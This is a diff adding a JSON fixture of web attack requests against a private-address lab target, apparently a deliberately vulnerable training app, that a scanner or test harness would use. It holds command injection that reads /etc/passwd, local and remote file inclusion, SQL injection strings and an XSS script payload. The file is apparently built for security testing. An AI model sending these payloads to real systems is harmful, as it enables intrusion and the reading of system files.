@@ -1,0 +1,49 @@
+{
+    "CI": [
+        {
+            "method": "POST",
+            "url": "http://172.30.1.60/vulnerabilities/exec/#",
+            "data": {
+                "ip": ";/bin/cat /etc/passwd",
+                "submit": "submit"
+            }
+        }
+    ],
+    "LFI": [
+        {
+            "method": "GET",
+            "url": "http://172.30.1.60/vulnerabilities/fi/?page=/etc/passwd"
+        }
+    ],
+    "RFI": [
+        {
+            "method": "GET",
+            "url": "http://172.30.1.60/vulnerabilities/fi/?page=hTtP://tests.arachni-scanner.com/rfi.md5.txt"
+        }
+    ],
+    "SQLI": [
+        {
+            "method": "GET",
+            "url": "http://172.30.1.60/vulnerabilities/sqli/?id=admin' or '1'='0&Submit=Submit#"
+        },
+        {
+            "method": "GET",
+            "url": "http://172.30.1.60/vulnerabilities/sqli_blind/?id=admin' or '1'='0&Submit=Submit#"
+        },
+        {
+            "method": "POST",
+            "url": "http://172.30.1.60/vulnerabilities/xss_s/",
+            "data": {
+                "txtName": "vulnch' or 1=0",
+                "btnSign": "Sign Guestbook",
+                "mtxMessage": "vulnch"
+            }
+        }
+    ],
+    "XSS": [
+        {
+            "method": "GET",
+            "url": "http://172.30.1.60/vulnerabilities/xss_r/?name=<script>onerror=alert;throw 1</script>"
+        }
+    ]
+}
